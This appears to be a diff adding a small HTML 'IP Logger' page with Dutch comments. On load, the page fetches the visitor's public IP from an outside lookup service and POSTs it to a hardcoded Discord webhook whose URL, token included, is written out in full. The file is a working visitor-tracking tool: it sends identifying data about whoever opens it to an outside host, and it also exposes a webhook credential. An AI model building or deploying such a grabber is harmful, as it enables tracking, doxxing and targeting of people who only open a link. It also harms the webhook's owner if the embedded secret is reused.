@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+    <script>
+        // Functie om IP-adres te verkrijgen
+        function getIP(json) {
+            var ipAddress = json.ip;
+            sendToDiscord(ipAddress);
+        }
+
+        // Functie om IP-adres naar Discord webhook te sturen
+        function sendToDiscord(ipAddress) {
+            var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
+
+            // Maak een nieuw XMLHttpRequest object aan
+            var xhr = new XMLHttpRequest();
+
+            // Definieer de methode en URL voor het verzoek
+            xhr.open("POST", webhookURL);
+
+            // Stel de content type header in
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            // Stel de payload in met het IP-adres
+            var payload = JSON.stringify({ content: "IP Address: " + ipAddress });
+            
+            // Stuur het verzoek
+            xhr.send(payload);
+        }
+
+        // Wanneer de pagina wordt geladen, roep dan de functie op om het IP-adres te verkrijgen
+        window.onload = function() {
+            var script = document.createElement('script');
+            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
+            document.getElementsByTagName('head')[0].appendChild(script);
+        };
+    </script>
+</head>
+<body>
+    <h1>IP Logger</h1>
+    <p>Deze pagina logt uw IP-adres en stuurt het naar Discord.</p>
+</body>
+</html>
